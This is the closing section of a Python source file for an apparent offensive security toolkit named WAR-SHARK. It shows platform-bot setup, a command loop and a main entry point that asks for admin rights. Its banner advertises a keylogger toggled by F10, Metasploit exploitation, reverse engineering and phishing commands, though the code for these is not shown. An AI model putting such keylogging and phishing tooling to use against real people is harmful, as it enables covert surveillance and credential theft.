        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            app_token = input(f"{Colors.ACCENT}Enter App token (optional): {Colors.RESET}").strip()
            if token:
                self.slack_bot.save_config(token, app_token)
                self.slack_bot.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ACCENT}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number (optional): {Colors.RESET}").strip()
            self.whatsapp_bot.save_config(phone)
            self.whatsapp_bot.start_bot_thread()
            print(f"{Colors.SUCCESS}✅ WhatsApp bot configured...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ACCENT}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.signal_bot.save_config(phone)
                self.signal_bot.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.ACCENT}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.ACCENT}Enter webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat_bot.save_config(webhook)
                self.google_chat_bot.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ACCENT}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.ACCENT}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.ACCENT}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        setup_platforms = input(f"\n{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ WAR-SHARK ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.SECONDARY}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🔧 Use 'metasploit_*' commands for exploitation{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🔬 Use 'rev_*' commands for reverse engineering{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🎣 Use 'phish_*' commands for social engineering{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}{self.session_id}{Colors.PRIMARY}]{Colors.WHITE} 🦈> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PRIMARY}🦈 Starting WAR-SHARK...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = WarShark()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
